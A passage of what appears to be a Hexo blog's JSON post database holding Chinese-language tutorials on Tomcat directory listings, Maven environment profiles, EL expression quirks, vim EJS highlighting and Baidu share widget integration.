</init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n修改listings参数值为 **true** 。\n\nlistings参数含义说明如下：\n``` xml\n  <!--   listings            Should directory listings be produced if there -->\n  <!--                       is no welcome file in this directory?  [false] -->\n  <!--                       WARNING: Listings for directories with many    -->\n  <!--                       entries can be slow and may consume            -->\n  <!--                       significant proportions of server resources.   -->\n```\n\n## 四、参考文档\nhttp://blog.csdn.net/guopengzhang/article/details/5948644\nhttp://xueli.blog.51cto.com/3325186/1585859","source":"_posts/article/java/tomcat访问系统文件及文件夹.md","raw":"title: tomcat访问系统文件及文件夹\ntags:\n  - tomcat\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\" />\n\n\n## 一、进入tomcat目录\n> cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37\n\n\n## 二、修改web.xml配置\n> vim conf/web.xml\n\n\n## 三、修改listings参数\n找到名为 **default** 的servlet配置。\n``` xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        </init-param>\n        <init-param>\n            <param-name>listings</param-name>\n            <param-value>true</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n修改listings参数值为 **true** 。\n\nlistings参数含义说明如下：\n``` xml\n  <!--   listings            Should directory listings be produced if there -->\n  <!--                       is no welcome file in this directory?  [false] -->\n  <!--                       WARNING: Listings for directories with many    -->\n  <!--                       entries can be slow and may consume            -->\n  <!--                       significant proportions of server resources.   -->\n```\n\n## 四、参考文档\nhttp://blog.csdn.net/guopengzhang/article/details/5948644\nhttp://xueli.blog.51cto.com/3325186/1585859","slug":"article/java/tomcat访问系统文件及文件夹","published":1,"updated":"2016-03-31T15:08:02.000Z","_id":"cilpxkgbg003xavbteo4rheg3","comments":1,"layout":"post","photos":[],"link":""},{"title":"maven不同环境资源文件打包","date":"2016-03-09T07:39:00.000Z","_content":"\n<img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\" />\n\n\n## 一、资源结构\nmaven工程资源结构如下：\n``` bash\nyerba-buena:jvwa yeshaoting$ tree src/main/resources/\nsrc/main/resources/\n├── app-db.properties\n├── app.properties\n├── dev\n│   ├── app-db.properties\n│   └── app.properties\n├── file\n│   ├── image.jpg\n│   └── stage6.jsp\n├── log4j.properties\n├── model\n│   └── UserMapper.xml\n├── prod\n│   ├── app-db.properties\n│   └── app.properties\n├── spring-beans.xml\n├── spring-db.xml\n└── spring-mvc.xml\n\n4 directories, 13 files\n```\n\n\n## 二、需求\n服务部署时，希望针对于不同的环境，使用不同的配置文件。\n针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。\n\n本地环境使用：src/main/resources/ 目录下的这二个文件。\n测试环境使用：src/main/resources/dev 目录下的这二个文件。\n生产环境使用：src/main/resources/prod 目录下的这二个文件。\n\n\n## 三、解决方案\n借助maven-resources-plugin插件，在pom.xml指定配置。\n打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。\n\n具体配置如下：\n\n### 1. 基本配置\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <build>\n        <plugins>\n          <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-resources-plugin</artifactId>\n            <version>2.6</version>\n            <executions>\n              <execution>\n                <id>copy-resources</id>\n                <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n                <phase>validate</phase>\n                <goals>\n                  <goal>copy-resources</goal>\n                </goals>\n                <configuration>\n                  <!-- 指定resources插件处理资源文件到哪个目录下 -->\n                  <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n                  <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n                  <!-- 待处理的资源定义 -->\n                  <resources>\n                    <resource>\n                      <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                      <directory>src/main/resources/dev</directory>\n                      <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                      <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                      <filtering>false</filtering>\n                    </resource>\n                  </resources>\n                </configuration>\n                <inherited></inherited>\n              </execution>\n            </executions>\n          </plugin>\n        </plugins>\n      </build>\n    </profile>\n</profiles>\n```\n\n### 2. 改进配置\n对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。\n\n我们在profile节点下添加properties属性，使用`deploy.env`来代替不同的环境目录名。于是改进后的配置如下：\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <properties>\n        <deploy.env>dev</deploy.env>\n      </properties>\n    </profile>\n    <profile>\n      <id>prod</id>\n      <properties>\n        <deploy.env>prod</deploy.env>\n      </properties>\n    </profile>\n  </profiles>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-resources-plugin</artifactId>\n        <version>2.6</version>\n        <executions>\n          <execution>\n            <id>copy-resources</id>\n            <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n            <phase>validate</phase>\n            <goals>\n              <goal>copy-resources</goal>\n            </goals>\n            <configuration>\n              <!-- 指定resources插件处理资源文件到哪个目录下 -->\n              <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n              <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n              <!-- 待处理的资源定义 -->\n              <resources>\n                <resource>\n                  <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                  <directory>src/main/resources/${deploy.env}</directory>\n                  <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                  <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样， \n                    这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                  <filtering>false</filtering>\n                </resource>\n              </resources>\n            </configuration>\n            <inherited></inherited>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n```\n\n**注**：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。\n\n\n## 四、参考文档\n[利用maven中resources插件的copy-resources目标进行资源copy和过滤](http://www.tuicool.com/articles/JfaA7r)\n[Copy Resources](http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html)\n[使用maven复制配置文件](http://www.blogjava.net/iduido/archive/2013/03/24/396913.html)\n[Maven 如何为不同的环境打包 —— 开发、测试和产品环境](https://www.zybuluo.com/haokuixi/note/25985)\n[maven copy file文件到指定目录](http://www.tuicool.com/articles/bEbaIz)\n","source":"_posts/article/java/maven不同环境资源文件打包.md","raw":"title: maven不同环境资源文件打包\ntags:\n  - maven\n  - java\ncategories:\n  - 后端开发\ndate: 2016-03-09 15:39:00\n---\n\n<img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\" />\n\n\n## 一、资源结构\nmaven工程资源结构如下：\n``` bash\nyerba-buena:jvwa yeshaoting$ tree src/main/resources/\nsrc/main/resources/\n├── app-db.properties\n├── app.properties\n├── dev\n│   ├── app-db.properties\n│   └── app.properties\n├── file\n│   ├── image.jpg\n│   └── stage6.jsp\n├── log4j.properties\n├── model\n│   └── UserMapper.xml\n├── prod\n│   ├── app-db.properties\n│   └── app.properties\n├── spring-beans.xml\n├── spring-db.xml\n└── spring-mvc.xml\n\n4 directories, 13 files\n```\n\n\n## 二、需求\n服务部署时，希望针对于不同的环境，使用不同的配置文件。\n针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。\n\n本地环境使用：src/main/resources/ 目录下的这二个文件。\n测试环境使用：src/main/resources/dev 目录下的这二个文件。\n生产环境使用：src/main/resources/prod 目录下的这二个文件。\n\n\n## 三、解决方案\n借助maven-resources-plugin插件，在pom.xml指定配置。\n打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。\n\n具体配置如下：\n\n### 1. 基本配置\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <build>\n        <plugins>\n          <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-resources-plugin</artifactId>\n            <version>2.6</version>\n            <executions>\n              <execution>\n                <id>copy-resources</id>\n                <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n                <phase>validate</phase>\n                <goals>\n                  <goal>copy-resources</goal>\n                </goals>\n                <configuration>\n                  <!-- 指定resources插件处理资源文件到哪个目录下 -->\n                  <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n                  <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n                  <!-- 待处理的资源定义 -->\n                  <resources>\n                    <resource>\n                      <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                      <directory>src/main/resources/dev</directory>\n                      <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                      <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                      <filtering>false</filtering>\n                    </resource>\n                  </resources>\n                </configuration>\n                <inherited></inherited>\n              </execution>\n            </executions>\n          </plugin>\n        </plugins>\n      </build>\n    </profile>\n</profiles>\n```\n\n### 2. 改进配置\n对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。\n\n我们在profile节点下添加properties属性，使用`deploy.env`来代替不同的环境目录名。于是改进后的配置如下：\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <properties>\n        <deploy.env>dev</deploy.env>\n      </properties>\n    </profile>\n    <profile>\n      <id>prod</id>\n      <properties>\n        <deploy.env>prod</deploy.env>\n      </properties>\n    </profile>\n  </profiles>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-resources-plugin</artifactId>\n        <version>2.6</version>\n        <executions>\n          <execution>\n            <id>copy-resources</id>\n            <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n            <phase>validate</phase>\n            <goals>\n              <goal>copy-resources</goal>\n            </goals>\n            <configuration>\n              <!-- 指定resources插件处理资源文件到哪个目录下 -->\n              <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n              <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n              <!-- 待处理的资源定义 -->\n              <resources>\n                <resource>\n                  <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                  <directory>src/main/resources/${deploy.env}</directory>\n                  <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                  <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样， \n                    这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                  <filtering>false</filtering>\n                </resource>\n              </resources>\n            </configuration>\n            <inherited></inherited>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n```\n\n**注**：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。\n\n\n## 四、参考文档\n[利用maven中resources插件的copy-resources目标进行资源copy和过滤](http://www.tuicool.com/articles/JfaA7r)\n[Copy Resources](http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html)\n[使用maven复制配置文件](http://www.blogjava.net/iduido/archive/2013/03/24/396913.html)\n[Maven 如何为不同的环境打包 —— 开发、测试和产品环境](https://www.zybuluo.com/haokuixi/note/25985)\n[maven copy file文件到指定目录](http://www.tuicool.com/articles/bEbaIz)\n","slug":"article/java/maven不同环境资源文件打包","published":1,"updated":"2016-03-31T15:07:48.000Z","_id":"cilpxkgbi0041avbtbr6a88el","comments":1,"layout":"post","photos":[],"link":""},{"title":"el数值运算取整","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 取整\nel表达式除法结果为浮点型，无法通过运算直接得到整数值。\n通过formatNumber保留整除后0位有效小数即可。\n如下所示：\n``` xml\n<fmt:formatNumber type=\"number\" value=\"${8/7)}\" maxFractionDigits=\"0\"/>\n```\n\n## 参考文档\nhttp://blog.csdn.net/debbykindom/article/details/5854750","source":"_posts/article/java/el数值运算取整.md","raw":"title: el数值运算取整\ntags:\n  - el\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 取整\nel表达式除法结果为浮点型，无法通过运算直接得到整数值。\n通过formatNumber保留整除后0位有效小数即可。\n如下所示：\n``` xml\n<fmt:formatNumber type=\"number\" value=\"${8/7)}\" maxFractionDigits=\"0\"/>\n```\n\n## 参考文档\nhttp://blog.csdn.net/debbykindom/article/details/5854750","slug":"article/java/el数值运算取整","published":1,"updated":"2016-03-31T15:08:05.000Z","_id":"cilpxkgbk0045avbtk3zviy2e","comments":1,"layout":"post","photos":[],"link":""},{"title":"EL access a map value by Integer key","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\nel表达式中，默认数值类型为Long型。\n\n## 一、问题描述\n\n**举例说明**：\nservlet定义并返回map数据如下：\n``` java\nMap<Integer, String> map = new HashMap<Integer, String>();\nmap.put(1, \"One\");\nmap.put(2, \"Two\");\nmap.put(3, \"Three\");\n```\n\n在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。\n因此，在前端不能通过，报异常。\n\n\n## 二、解决方案\n将数值转成int型，如下所示：\n`${map[(2).intValue()]}`\n\n\n## 三、参考文档\nhttp://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key","source":"_posts/article/java/EL access a map value by Integer key.md","raw":"title: EL access a map value by Integer key\ntags:\n  - el\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\nel表达式中，默认数值类型为Long型。\n\n## 一、问题描述\n\n**举例说明**：\nservlet定义并返回map数据如下：\n``` java\nMap<Integer, String> map = new HashMap<Integer, String>();\nmap.put(1, \"One\");\nmap.put(2, \"Two\");\nmap.put(3, \"Three\");\n```\n\n在jsp页面，通过map[2]不能获取数据Two。因为数值2被装箱成Long型，而map键类型为Integer。\n因此，在前端不能通过，报异常。\n\n\n## 二、解决方案\n将数值转成int型，如下所示：\n`${map[(2).intValue()]}`\n\n\n## 三、参考文档\nhttp://stackoverflow.com/questions/924451/el-access-a-map-value-by-integer-key","slug":"article/java/EL access a map value by Integer key","published":1,"updated":"2016-03-31T15:07:44.000Z","_id":"cilpxkgbl0049avbthwd2eksz","comments":1,"layout":"post","photos":[],"link":""},{"title":"vim高亮显示ejs格式内容","date":"2016-02-16T03:51:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ejs.png\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n[官方介绍](http://www.embeddedjs.com/)如下：\n> EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.\n\n\n## 二、解决方法\n\n### 方法一 视ejs格式为html格式\n``` bash\nau BufNewFile,BufRead *.ejs set filetype=html\n```\n\n详细au命令参见：[AUTOCMD](http://vimcdoc.sourceforge.net/doc/autocmd.html)\n\n\n### 方法二 定制ejs格式语法高亮\n\n#### 1. 下载ejs语法文件\n下载ejs.vim文件到~/.vim/syntax/目录。\n下载地址：https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\n\n文件内容如下：\n``` bash\nruntime! syntax/html.vim\nunlet b:current_syntax\n\n\" Include Java syntax\nsyn include @ejsJavaScript syntax/javascript.vim\n\nsyn region ejsScriptlet matchgroup=ejsTag start=/<%/  keepend end=/%>/ contains=@ejsJavaScript\nsyn region ejsExpr\tmatchgroup=ejsTag start=/<%=/ keepend end=/%>/ contains=@ejsJavaScript\n\n\" Redefine htmlTag so that it can contain jspExpr\nsyn clear htmlTag\nsyn region htmlTag start=+<[^/%]+ end=+>+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript\n\n\n\" syn keyword ejsPrint contained print\nsyn match javaScriptType        /\\<\\zsvars\\ze\\./\nsyn match javaScriptSpecial     /\\<\\zsexports\\ze\\./\nsyn match javaScriptFunction    /\\<\\zsprint\\ze(/\nsyn match javaScriptFunction    /\\<\\zsinclude\\ze(/\nsyn match javaScriptFunction    /\\<\\zsincludeObject\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetch\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetchObject\\ze(/\n\ncommand -nargs=+ HiLink hi def link <args>\nHiLink  ejsTag      htmlTag\ndelcommand HiLink\n\nlet b:current_syntax = \"ejs\"\n```\n\n#### 2. 设置ejs格式语法\n``` bash\n au BufNewFile,BufRead *.ejs set filetype=ejs\n```\n\n\n## 三、参考文档\n[Syntax highlight for .ejs files in vim](http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim)\n","source":"_posts/article/hexo/vim高亮显示ejs格式内容.md","raw":"title: vim高亮显示ejs格式内容\ntags:\n  - hexo\n  - vim\ncategories:\n  - 博客搭建\ndate: 2016-02-16 11:51:00\n---\n\n<img src=\"/asserts/images/logo/ejs.png\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n[官方介绍](http://www.embeddedjs.com/)如下：\n> EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.\n\n\n## 二、解决方法\n\n### 方法一 视ejs格式为html格式\n``` bash\nau BufNewFile,BufRead *.ejs set filetype=html\n```\n\n详细au命令参见：[AUTOCMD](http://vimcdoc.sourceforge.net/doc/autocmd.html)\n\n\n### 方法二 定制ejs格式语法高亮\n\n#### 1. 下载ejs语法文件\n下载ejs.vim文件到~/.vim/syntax/目录。\n下载地址：https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\n\n文件内容如下：\n``` bash\nruntime! syntax/html.vim\nunlet b:current_syntax\n\n\" Include Java syntax\nsyn include @ejsJavaScript syntax/javascript.vim\n\nsyn region ejsScriptlet matchgroup=ejsTag start=/<%/  keepend end=/%>/ contains=@ejsJavaScript\nsyn region ejsExpr\tmatchgroup=ejsTag start=/<%=/ keepend end=/%>/ contains=@ejsJavaScript\n\n\" Redefine htmlTag so that it can contain jspExpr\nsyn clear htmlTag\nsyn region htmlTag start=+<[^/%]+ end=+>+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript\n\n\n\" syn keyword ejsPrint contained print\nsyn match javaScriptType        /\\<\\zsvars\\ze\\./\nsyn match javaScriptSpecial     /\\<\\zsexports\\ze\\./\nsyn match javaScriptFunction    /\\<\\zsprint\\ze(/\nsyn match javaScriptFunction    /\\<\\zsinclude\\ze(/\nsyn match javaScriptFunction    /\\<\\zsincludeObject\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetch\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetchObject\\ze(/\n\ncommand -nargs=+ HiLink hi def link <args>\nHiLink  ejsTag      htmlTag\ndelcommand HiLink\n\nlet b:current_syntax = \"ejs\"\n```\n\n#### 2. 设置ejs格式语法\n``` bash\n au BufNewFile,BufRead *.ejs set filetype=ejs\n```\n\n\n## 三、参考文档\n[Syntax highlight for .ejs files in vim](http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim)\n","slug":"article/hexo/vim高亮显示ejs格式内容","published":1,"updated":"2016-04-06T08:26:41.000Z","_id":"cilpxkgbq004havbti2kboupc","comments":1,"layout":"post","photos":[],"link":""},{"title":"jacman主题集成百度分享","date":"2016-02-16T08:53:00.000Z","_content":"\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、集成百度分享\njacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：\n\n### 1. 登录或注册百度\n登录[百度分享](http://share.baidu.com/)，完成登录或注册。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\nbdshare:\n  enable: true ## if you use baidu share as your share tool,the built-in share tool won't be display.\n```\n\n**注**：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\n百度分享相关代码逻辑：\n``` html\n<div class=\"article-share\" id=\"share\">\n    <% if(theme.bdshare.enable){ %>\n      <%- partial('bdshare') %>\n    <% } else { %>\n        <% if(theme.jiathis.enable){ %>\n        <div class=\"share-jiathis\">\n          <%- partial('jiathis') %>\n         </div>\n        <% } else { %>\n          <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n          </div>\n        <% } %>\n    <% } %>\n    </div>\n```\n\n在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。\n\n**注**：`<%- partial('bdshare') %>`语法表示加载当前目录下的bdshare.ejs文件。\n\n### 4. 百度分享模块\n代码：themes/jacman/layout/_partial/post/bdshare.ejs\n\n新建bdshare.ejs，并复制如下内容：\n``` html\n<% if (theme.bdshare.enable){ %>\n    <div class=\"bdsharebuttonbox\">\n        <a href=\"#\" class=\"bds_more\" data-cmd=\"more\"></a>\n        <a href=\"#\" class=\"bds_sqq\" data-cmd=\"sqq\" title=\"分享到QQ好友\"></a>\n        <a href=\"#\" class=\"bds_qzone\" data-cmd=\"qzone\" title=\"分享到QQ空间\"></a>\n        <a href=\"#\" class=\"bds_weixin\" data-cmd=\"weixin\" title=\"分享到微信\"></a>\n        <a href=\"#\" class=\"bds_tsina\" data-cmd=\"tsina\" title=\"分享到新浪微博\"></a>\n        <a href=\"#\" class=\"bds_renren\" data-cmd=\"renren\" title=\"分享到人人网\"></a>\n        <a href=\"#\" class=\"bds_count\" data-cmd=\"count\"></a>\n    </div>\n    <script>window._bd_share_config={\"common\":{\"bdSnsKey\":{},\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"},\"share\":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>\n<% } %>\n```\n\n### 5. 检测分享代码版本\n``` javascript\n//打开已安装分享代码的页面，在控制台中执行：\njavascript:b=(window.bdShare||window._bd_share_main);alert(b?'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'+(b.version||'1.0'):'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002')\n```\n\n参见：[检测分享代码版本](http://share.baidu.com/code/advance#tools)\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png)\n\n\n## 四、小结\n百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。\n内容分享描述比较简单，仅仅只支持标题是硬伤。\n","source":"_posts/article/hexo/jacman主题集成百度分享.md","raw":"title: jacman主题集成百度分享\ntags:\n  - hexo\n  - 分享代码\ncategories:\n  - 博客搭建\ndate: 2016-02-16 16:53:00\n---\n\n<img src=\"/asserts/images/logo/hexo.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n本文内容基于wuchong的Jacman主题。\n\n### 1. 默认分享样式\n默认分享样式如下图所示：\n![默认分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png)\n\n### 2. 代码位置\n分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs\n代码块：\n``` html\n<div class=\"article-share\" id=\"share\">\n</div>\n```\n\n\n## 二、集成百度分享\njacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：\n\n### 1. 登录或注册百度\n登录[百度分享](http://share.baidu.com/)，完成登录或注册。\n\n### 2. 主题配置\n修改主题配置文件themes/jacman/_config.yml，如下：\n\n``` txt\nbdshare:\n  enable: true ## if you use baidu share as your share tool,the built-in share tool won't be display.\n```\n\n**注**：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。\n\n### 3. 代码逻辑\n代码：themes/jacman/layout/_partial/post/footer.ejs\n\n百度分享相关代码逻辑：\n``` html\n<div class=\"article-share\" id=\"share\">\n    <% if(theme.bdshare.enable){ %>\n      <%- partial('bdshare') %>\n    <% } else { %>\n        <% if(theme.jiathis.enable){ %>\n        <div class=\"share-jiathis\">\n          <%- partial('jiathis') %>\n         </div>\n        <% } else { %>\n          <div data-url=\"<%- item.permalink %>\" data-title=\"<% if (item.title){ %><%= item.title %> | <% } %><%= config.title %>\" data-tsina=\"<%= theme.author.tsina %>\" class=\"share clearfix\">\n          </div>\n        <% } %>\n    <% } %>\n    </div>\n```\n\n在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。\n\n**注**：`<%- partial('bdshare') %>`语法表示加载当前目录下的bdshare.ejs文件。\n\n### 4. 百度分享模块\n代码：themes/jacman/layout/_partial/post/bdshare.ejs\n\n新建bdshare.ejs，并复制如下内容：\n``` html\n<% if (theme.bdshare.enable){ %>\n    <div class=\"bdsharebuttonbox\">\n        <a href=\"#\" class=\"bds_more\" data-cmd=\"more\"></a>\n        <a href=\"#\" class=\"bds_sqq\" data-cmd=\"sqq\" title=\"分享到QQ好友\"></a>\n        <a href=\"#\" class=\"bds_qzone\" data-cmd=\"qzone\" title=\"分享到QQ空间\"></a>\n        <a href=\"#\" class=\"bds_weixin\" data-cmd=\"weixin\" title=\"分享到微信\"></a>\n        <a href=\"#\" class=\"bds_tsina\" data-cmd=\"tsina\" title=\"分享到新浪微博\"></a>\n        <a href=\"#\" class=\"bds_renren\" data-cmd=\"renren\" title=\"分享到人人网\"></a>\n        <a href=\"#\" class=\"bds_count\" data-cmd=\"count\"></a>\n    </div>\n    <script>window._bd_share_config={\"common\":{\"bdSnsKey\":{},\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"},\"share\":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>\n<% } %>\n```\n\n### 5. 检测分享代码版本\n``` javascript\n//打开已安装分享代码的页面，在控制台中执行：\njavascript:b=(window.bdShare||window._bd_share_main);alert(b?'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'+(b.version||'1.0'):'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002')\n```\n\n参见：[检测分享代码版本](http://share.baidu.com/code/advance#tools)\n\n\n## 